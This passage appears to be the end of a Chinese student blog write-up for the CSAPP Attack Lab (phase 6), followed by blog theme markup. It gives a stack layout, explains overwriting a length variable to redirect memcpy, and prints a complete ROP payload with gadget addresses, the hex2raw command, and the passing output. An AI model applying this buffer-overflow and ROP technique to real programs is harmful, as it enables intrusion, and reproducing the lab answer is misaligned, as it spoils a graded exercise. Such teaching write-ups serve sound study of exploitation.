+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">单位：字节<br>+-------------------+<br>|   return addr[8]  |<br>+-------------------+<br>|      %rbp[8]      |<br>+-------------------+<br>|     canary[8]     |<br>+-------------------+<br>|       [16]        |<br>+-------------------+<br>|  len[4]  |        |<br>+-------------------+<br>|     buf[128]      |<br>+-------------------+<br>|    logMsg[128]    |<br>+-------------------+<br></code></pre></td></tr></table></figure>
+
+<p>我们发现 <code>len</code> 变量位于 <code>buf</code> 之后，因此我们可以通过 <code>buf</code> 来覆写 <code>len</code> 的值，从而控制 <code>memcpy</code> 函数的复制字符串的目的地址，进而实现 ROP 攻击。需要注意，<code>memcpy</code> 函数只复制 128 字节，这意味着我们的 ROP 链不能过长。</p>
+<p>接下来，我们只需要计算好偏移量，然后照搬 phase 5 的 ROP 链即可。注意 phase 6 中的 <code>touch3</code> 和对应 <code>gadget</code> 地址与 phase 5 不同。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">/* phase6.txt */<br>eb 1e 40 00 00 00 00 00 /* Gadget 1 */<br>83 1e 40 00 00 00 00 00 /* Gadget 2 */<br>a3 1e 40 00 00 00 00 00 /* Gadget 3 */<br>48 00 00 00 00 00 00 00 /* Bias value 72 */<br>8a 1f 40 00 00 00 00 00 /* Gadget 4 */<br>95 1f 40 00 00 00 00 00 /* Gadget 5 */<br>00 1f 40 00 00 00 00 00 /* Gadget 6 */<br>d6 1e 40 00 00 00 00 00 /* Gadget 7 */<br>83 1e 40 00 00 00 00 00 /* Gadget 8 */<br>22 1d 40 00 00 00 00 00 /* Address of touch3 function */<br>32 34 63 38 63 65 36 36 /* cookie string &quot;24c8ce66&quot; */<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00<br>28 01 00 00 /* len value 296 */<br></code></pre></td></tr></table></figure>
+
+<p>转换为原始字节序列并传递给 <code>starget</code> 程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> phase6.txt | ./hex2raw | ./starget<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Cookie: 0x24c8ce66<br>Type string:Touch3!: You called touch3(&quot;24c8ce66&quot;)<br>Valid solution for level 3 with target starget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p><i class="iconfont icon-href"></i> <a target="_blank" rel="noopener" href="https://arthals.ink/blog/attack-lab">更适合北大宝宝体质的 Attack Lab 踩坑记</a><br><i class="iconfont icon-href"></i> <a target="_blank" rel="noopener" href="https://www.wdxtub.com/blog/csapp/thick-csapp-lab-3">读厚 CSAPP III Attack Lab</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/NOTE/" class="category-chain-item">NOTE</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pku/" class="print-no-link">#pku</a>
+      
+        <a href="/tags/ics/" class="print-no-link">#ics</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ICS | 缓冲区溢出，你看你干的好事！</div>
+      <div>https://staaaaaaaaar.github.io/2025/10/18/ics-attacklab/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Sam</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 18, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - Non-commercial">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - Share-alike">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/17/fluid-stats-guide/" title="Fluid + LeanCloud | 启用网页统计配置">
+                        <span class="hidden-mobile">Fluid + LeanCloud | 启用网页统计配置</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> · <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Views: 
+        <span id="leancloud-site-pv"></span>
+        
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Visitors: 
+        <span id="leancloud-site-uv"></span>
+        
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
